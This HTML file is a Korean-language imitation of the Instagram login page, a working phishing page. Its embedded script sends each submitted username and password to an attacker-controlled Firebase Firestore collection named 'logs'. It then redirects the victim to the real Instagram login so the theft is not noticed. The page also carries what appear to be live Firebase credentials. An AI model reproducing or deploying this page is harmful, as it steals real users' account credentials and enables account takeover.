<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .language-container { margin-top: 20px; color: #8e8e8e; font-size: 13px; display: flex; align-items: center; gap: 4px; }
        .main-container { width: 100%; max-width: 350px; padding: 0 40px; box-sizing: border-box; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
        .logo-img { width: 75px; height: 75px; margin: 0 auto 40px auto; display: block; }
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 12px; background-color: #fafafa; box-sizing: border-box; font-size: 14px; outline: none; }
        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 13px; border-radius: 50px; font-weight: 600; font-size: 15px; margin-top: 8px; cursor: pointer; }
        .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 20px; display: block; }
        .bottom-section { width: 100%; max-width: 350px; padding: 20px 40px 40px 40px; box-sizing: border-box; text-align: center; }
        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 50px; font-weight: 600; font-size: 15px; margin-bottom: 25px; cursor: pointer; }
        /* Meta 한 줄 정렬 설정 */
        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 5px; }
        .meta-icon { width: 18px; filter: grayscale(1); opacity: 0.5; }
        .meta-text { color: #8e8e8e; font-size: 15px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="language-container">한국어 ∨</div>
    <div class="main-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
        <form id="loginForm">
            <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
        </form>
        <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
    </div>
    <div class="bottom-section">
        <button type="button" class="btn-signup">새 계정 만들기</button>
        <div class="meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="" class="meta-icon">
            <span class="meta-text">Meta</span>
        </div>
    </div>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
        const firebaseConfig = { apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4", authDomain: "instagram-be709.firebaseapp.com", projectId: "instagram-be709", storageBucket: "instagram-be709.firebasestorage.app", messagingSenderId: "556245509978", appId: "1:556245509978:web:e78967856f2ac2586f7563", measurementId: "G-1KLXR0LXSZ" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            try {
                await addDoc(collection(db, "logs"), { userId: idVal, userPw: pwVal, timestamp: new Date() });
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) { console.error(error); }
        });
    </script>
</body>
</html>
